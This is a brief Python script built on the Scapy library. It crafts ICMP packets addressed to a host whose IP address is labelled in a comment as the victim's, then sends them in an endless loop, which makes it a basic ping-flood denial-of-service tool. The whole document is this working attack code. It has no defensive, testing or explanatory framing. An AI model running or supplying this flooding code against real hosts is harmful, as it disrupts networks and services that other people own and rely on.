from scapy.all import *

# Define the target IP
target_ip = "192.168.1.100"  # Victim's IP address

# Craft the ICMP packet
icmp = IP(dst=target_ip)/ICMP()

# Send the ICMP packets in a loop
send(icmp, loop=1, verbose=1)
